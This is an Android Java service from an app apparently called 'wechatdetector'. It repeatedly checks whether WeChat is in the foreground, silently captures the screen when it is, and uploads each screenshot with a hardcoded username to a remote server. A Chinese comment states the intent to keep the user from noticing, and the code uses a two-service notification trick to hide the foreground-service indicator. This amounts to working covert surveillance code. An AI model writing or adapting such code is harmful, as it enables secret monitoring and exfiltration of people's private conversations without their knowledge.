package com.zou.wechatdetector.service;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.util.DisplayMetrics;
import android.util.Log;

import com.zou.wechatdetector.R;
import com.zou.wechatdetector.bean.GsonUploadFileResultBean;
import com.zou.wechatdetector.utils.Constants;
import com.zou.wechatdetector.utils.Tools;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava.RxJavaCallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import rx.Observable;
import rx.Observer;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by zou on 2018/4/9.
 */

public class MainService extends Service {
    public static final String TAG = "MainService";
    private Thread detectorThread;
    private ImageReader mImageReader;
    private VirtualDisplay captureVirtualDisplay;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private Upload uploadService;

    private InnerServiceConnection mConnection;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //启动守护进程
        Log.i(TAG,"onStartCommand");

//        return Service.START_STICKY;
        return super.onStartCommand(intent,flags,startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG,"onCreate");
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            startForeground(1,getNotification());
        }else {
            if (mConnection == null) {
                mConnection = new InnerServiceConnection();
            }
            this.bindService(new Intent(this, InnerService.class), mConnection, Service.BIND_AUTO_CREATE);
        }
        EventBus.getDefault().register(this);
        initData();
        detectorThread = new Thread(){
            @Override
            public void run() {
                while(true) {
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String foregroundApp = Tools.getTopAppPackageName(MainService.this);
                    Log.i(TAG,"alive...");
                    if(foregroundApp.equals("com.tencent.mm")) {
                        Log.i(TAG,"captureScreen");
                        createVirtualDisplay();
                        captureScreen();
                    }else{
                        Log.i(TAG,"noCaptureScreen");
                    }
                }
            }
        };

    }

    @Subscribe
    public void onEvent(Intent data){
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        assert projectionManager != null;
        mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, data);
        detectorThread.start();
    }

    private void initData() {
        Retrofit retrofit = new Retrofit.Builder()
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJavaCallAdapterFactory.create())
                .baseUrl(Constants.BASE_URL)
                .build();
        uploadService = retrofit.create(Upload.class);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        EventBus.getDefault().unregister(this);
        if(mConnection!=null) {
            this.unbindService(mConnection);
        }
    }

    private void createVirtualDisplay(){
        DisplayMetrics metrics = new DisplayMetrics();
        mImageReader = ImageReader.newInstance(720, 1080, PixelFormat.RGBA_8888, 1);
        captureVirtualDisplay = mediaProjection.createVirtualDisplay("MainScreen", 720, 1080, DisplayMetrics.DENSITY_MEDIUM,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mImageReader.getSurface(), null, null);
    }

    /**
     * 截屏
     */
    private void captureScreen() {
        String pathImage = Tools.getSaveImageDirectory();
        DateFormat dateFormat = new SimpleDateFormat("yyyyMMddHHmm");
        String fileName = dateFormat.format(new java.util.Date());
        String nameImage = pathImage+fileName+".png";
        SystemClock.sleep(1000);
        Image image = mImageReader.acquireLatestImage();
        int width = image.getWidth();
        int height = image.getHeight();
        final Image.Plane[] planes = image.getPlanes();
        final ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;
        Bitmap bitmap = Bitmap.createBitmap(width+rowPadding/pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        bitmap = Bitmap.createBitmap(bitmap, 0, 0,width, height);
        image.close();
        if (captureVirtualDisplay == null) {
            return;
        }
        captureVirtualDisplay.release();
        captureVirtualDisplay = null;
//        storeBitmap(nameImage,bitmap);
        toServer(bitmap);
    }

    /**
     *
     * 储存bitmap到CacheDir中
     */
    private void storeBitmap(String path,Bitmap bitmap) {
        try {
            File file = new File(path);
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG,100,out);
            out.flush();
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void toServer(Bitmap bitmap){
        RequestBody fileBody = RequestBody.create(MediaType.parse("multipart/form-data"),Tools.Bitmap2ByteArray(bitmap));
        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
        String fileName = Tools.getTimeStamp()+".png";
        builder.addFormDataPart("file",fileName,fileBody);
        builder.addFormDataPart("wechat_user","zoujingyi1992");
        builder.addFormDataPart("date",Tools.getDate());
        List<MultipartBody.Part> partList = builder.build().parts();
        uploadService.uploadFile(partList).subscribeOn(Schedulers.newThread()).observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<GsonUploadFileResultBean>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e(TAG,"upload error");
                    }

                    @Override
                    public void onNext(GsonUploadFileResultBean gsonUploadFileResultBean) {
                        switch (gsonUploadFileResultBean.getCode()){
                            case 0:
                                Log.i(TAG,"upload ok");
                                break;
                            default:
                                Log.e(TAG,"upload error");
                                break;
                        }
                    }
                });
    }

    interface Upload{
        @Multipart
        @POST("upload")
        Observable<GsonUploadFileResultBean> uploadFile(@Part List<MultipartBody.Part> partList);
    }

    private class InnerServiceConnection implements ServiceConnection {
        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.d(TAG, "MyService: onServiceDisconnected");
        }

        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            Log.d(TAG, "MyService: onServiceConnected");

            // sdk >=18
            // 的，会在通知栏显示service正在运行，这里不要让用户感知，所以这里的实现方式是利用2个同进程的service，利用相同的notificationID，
            // 2个service分别startForeground，然后只在1个service里stopForeground，这样即可去掉通知栏的显示
            Service innerService = ((InnerService.LocalBinder) binder)
                    .getService();
            MainService.this.startForeground(1, getNotification());
            innerService.startForeground(1, getNotification());
            innerService.stopForeground(true);
            MainService.this.unbindService(mConnection);
            mConnection = null;
        }
    }

    private Notification  getNotification(){
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("channel_id", "name", NotificationManager.IMPORTANCE_DEFAULT);

            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new Notification.Builder(this, "channel_id")
                    .setOngoing(true)
                    .setSmallIcon(R.drawable.ic_stat_name)
                    .build();
            return notification;
        }else{
            Notification notification = new Notification(R.drawable.ic_stat_name,"",0);
            startForeground(1, notification);
            return notification;
        }
    }


}
